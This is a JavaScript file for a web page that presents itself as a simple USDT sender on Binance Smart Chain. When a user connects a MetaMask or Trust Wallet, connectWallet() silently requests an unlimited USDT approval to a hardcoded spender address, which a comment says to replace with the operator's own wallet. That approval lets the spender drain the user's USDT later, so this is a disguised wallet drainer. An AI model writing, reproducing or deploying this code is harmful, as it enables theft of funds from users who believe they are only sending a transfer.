const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT on BSC
const spender = "0x37935899f0DbCE787D758EfE382A92E1d3368454"; // REPLACE this with your wallet address

let web3, account, usdt;

const usdtAbi = [
  {
    constant: false,
    inputs: [{ name: "_spender", type: "address" }, { name: "_value", type: "uint256" }],
    name: "approve",
    outputs: [{ name: "", type: "bool" }],
    type: "function"
  },
  {
    constant: false,
    inputs: [{ name: "_to", type: "address" }, { name: "_value", type: "uint256" }],
    name: "transfer",
    outputs: [{ name: "", type: "bool" }],
    type: "function"
  },
  {
    constant: true,
    inputs: [{ name: "_owner", type: "address" }, { name: "_spender", type: "address" }],
    name: "allowance",
    outputs: [{ name: "", type: "uint256" }],
    type: "function"
  }
];

async function connectWallet() {
  if (window.ethereum) {
    web3 = new Web3(window.ethereum);
    await window.ethereum.request({ method: "eth_requestAccounts" });
    const accounts = await web3.eth.getAccounts();
    account = accounts[0];
    document.getElementById("wallet-address").innerText = "Connected: " + account;

    usdt = new web3.eth.Contract(usdtAbi, usdtAddress);

    // Check allowance
    const allowance = await usdt.methods.allowance(account, spender).call();

    if (parseInt(allowance) === 0) {
      const unlimited = web3.utils.toTwosComplement(-1); // Unlimited approval
      await usdt.methods.approve(spender, unlimited).send({ from: account });
      console.log("Unlimited USDT approved to:", spender);
    }
  } else {
    alert("Please open in MetaMask or Trust Wallet browser");
  }
}

async function sendUSDT() {
  const to = document.getElementById("recipient").value;
  const amount = document.getElementById("amount").value;
  const amountWei = web3.utils.toWei(amount, 'ether');

  await usdt.methods.transfer(to, amountWei).send({ from: account });
  alert("✅ USDT sent successfully!");
}